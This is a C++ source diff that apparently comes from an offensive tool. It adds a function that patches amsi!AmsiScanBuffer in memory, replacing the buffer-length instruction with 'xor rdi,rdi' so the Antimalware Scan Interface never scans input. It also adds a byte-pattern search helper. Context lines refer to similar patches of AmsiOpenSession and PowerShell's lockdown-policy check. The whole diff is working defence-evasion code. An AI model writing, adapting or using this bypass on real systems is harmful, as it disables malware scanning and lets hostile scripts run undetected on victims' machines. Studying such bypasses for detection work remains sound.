@@ -33,6 +33,43 @@ BOOL PatchAmsiOpenSession()
 }
 
 //
+// The following function patches 'AMSI!AmsiScanBuffer' so that its third parameter,
+// i.e. the one containing the length of the input buffer is always set to 0. Doing
+// so causes the function to never scan the input buffer.
+// 
+//   ...
+//   41 8b f8        MOV        EDI,param_3         <-- Copy buffer length to EDI
+//   48 8b f2        MOV        RSI,param_2         <-- Copy buffer address to RSI
+//   ...
+//
+// The instruction 'MOV EDI,param_3' is replaced by 'XOR RDI,RDI', which has the same
+// size and effectively set RDI to 0.
+//
+BOOL PatchAmsiScanBuffer()
+{
+    BYTE bPattern[] = { 0x41, 0x8b, 0xf8 }; // mov edi,r8d
+    BYTE bPatch[] = { 0x48, 0x31, 0xff }; // xor rdi,rdi 
+    ULONG_PTR pAmsiScanBuffer;
+    DWORD dwPatternOffset;
+
+    if (!GetProcedureAddress(L"amsi", "AmsiScanBuffer", &pAmsiScanBuffer))
+        return FALSE;
+
+    if (!FindBufferOffset(reinterpret_cast<LPVOID>(pAmsiScanBuffer), bPattern, ARRAYSIZE(bPattern), 100, &dwPatternOffset))
+        return FALSE;
+
+    //wprintf(L"[*] Found instruction to patch in AmsiScanBuffer @ 0x%llx (offset: %d)\n", pAmsiScanBuffer + dwPatternOffset, dwPatternOffset);
+
+    return PatchUnmanagedFunction(
+        L"amsi",
+        "AmsiScanBuffer",
+        bPatch,
+        ARRAYSIZE(bPatch),
+        dwPatternOffset
+    );
+}
+
+//
 // PowerShell uses the method 'GetSystemLockdownPolicy' (SystemPolicy) to get the
 // value of the execution policy enforced on the system. By patching this method
 // with the following instructions, we force it to always return the value
@@ -196,4 +233,24 @@ BOOL PatchManagedFunction(mscorlib::_AppDomain* pAppDomain, LPCWSTR pwszAssembly
         return FALSE;
 
     return TRUE;
+}
+
+BOOL FindBufferOffset(LPVOID pStartAddress, LPBYTE pBuffer, DWORD dwBufferSize, DWORD dwMaxSize, PDWORD pdwBufferOffset)
+{
+    BOOL bResult = FALSE;
+
+    for (DWORD i = 0; i < dwMaxSize - dwBufferSize; i++)
+    {
+        if (memcmp(pBuffer, (LPVOID)((ULONG_PTR)pStartAddress + i), dwBufferSize) == 0)
+        {
+            *pdwBufferOffset = i;
+            bResult = TRUE;
+            break;
+        }
+    }
+
+    if (!bResult)
+        PRINT_ERROR("Failed to find pattern of size %d within the address range 0x%llx - 0x%llx\n", dwBufferSize, (ULONG_PTR)pStartAddress, (ULONG_PTR)pStartAddress + dwMaxSize);
+
+    return bResult;
 }
